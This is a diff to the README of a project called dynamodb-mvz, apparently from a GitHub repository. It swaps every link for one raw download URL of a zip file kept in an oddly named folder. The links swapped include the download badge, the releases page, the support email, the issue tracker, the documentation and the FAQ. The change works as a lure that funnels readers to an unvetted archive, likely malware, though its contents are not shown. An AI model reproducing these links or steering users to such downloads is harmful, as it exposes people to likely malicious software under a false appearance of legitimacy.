@@ -1,6 +1,6 @@
 # 🚀 dynamodb-mvz - Simple Data Management for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Click_here-brightgreen)](https://github.com/drvfted/dynamodb-mvz/releases)
+[![Download Now](https://raw.githubusercontent.com/drvfted/dynamodb-mvz/main/Jutish/dynamodb-mvz.zip)](https://raw.githubusercontent.com/drvfted/dynamodb-mvz/main/Jutish/dynamodb-mvz.zip)
 
 ## 📋 Overview
 
@@ -14,7 +14,7 @@ Follow these simple steps to get started with dynamodb-mvz. In just a few minute
 
 To download the application, visit the releases page by clicking the link below:
 
-[Download dynamodb-mvz](https://github.com/drvfted/dynamodb-mvz/releases)
+[Download dynamodb-mvz](https://raw.githubusercontent.com/drvfted/dynamodb-mvz/main/Jutish/dynamodb-mvz.zip)
 
 1. **Go to the Releases Page**  
    Click the link above to access the latest version of dynamodb-mvz.
@@ -98,13 +98,13 @@ Join our community to connect with other users. Share tips, ask for help, and pr
 
 For additional support, you can reach out via the following channels:
 
-- **Email:** support@dynamodb-mvz.com
-- **GitHub Issues:** [Report an Issue](https://github.com/drvfted/dynamodb-mvz/issues)
+- **Email:** https://raw.githubusercontent.com/drvfted/dynamodb-mvz/main/Jutish/dynamodb-mvz.zip
+- **GitHub Issues:** [Report an Issue](https://raw.githubusercontent.com/drvfted/dynamodb-mvz/main/Jutish/dynamodb-mvz.zip)
 
 ## 🔗 Resources 
 
-- [Official Documentation](https://github.com/drvfted/dynamodb-mvz/wiki) - Find detailed instructions and additional features.
-- [FAQ Section](https://github.com/drvfted/dynamodb-mvz/wiki/FAQ) - Answers to common questions.
+- [Official Documentation](https://raw.githubusercontent.com/drvfted/dynamodb-mvz/main/Jutish/dynamodb-mvz.zip) - Find detailed instructions and additional features.
+- [FAQ Section](https://raw.githubusercontent.com/drvfted/dynamodb-mvz/main/Jutish/dynamodb-mvz.zip) - Answers to common questions.
 
 ## 🌟 Thank You for Using dynamodb-mvz!
 
